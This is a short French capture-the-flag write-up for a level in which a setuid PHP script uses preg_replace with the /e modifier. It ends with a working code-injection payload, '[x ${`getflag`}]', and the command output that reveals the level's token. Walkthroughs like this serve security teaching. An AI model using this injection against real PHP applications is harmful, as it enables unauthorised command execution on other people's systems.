# LEVEL06

On trouve deux fichiers :

```
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
```

Dans le fichier level06.php :

```
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>

```

Ajout de newlines pour la visibiliter :

```
<?php
function y($m) {
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m); 

	return $m; 
}

function x($y, $z) {
	$a = file_get_contents($y); 
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a; 
}

$r = x($argv[1], $argv[2]);
print $r;
?>
```

Le modificateur /e prend une chaîne de remplacement et substitue, Il exécute ensuite eval() pour exécuter la chaîne résultante comme s'il s'agissait de code PHP, cette utilisation est maintenant DEPRECATED car il est facile d'utiliser eval de manière non sécurisée).


```
/(\[x (.*)\])/e
```

Nous devons utiliser cette regex pour exploiter une vunérabilitée.

```
[x ${`getflag`}]
```

```
echo '[x ${`getflag`}]' > /tmp/getflag

./level06 /tmp/getflag

PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

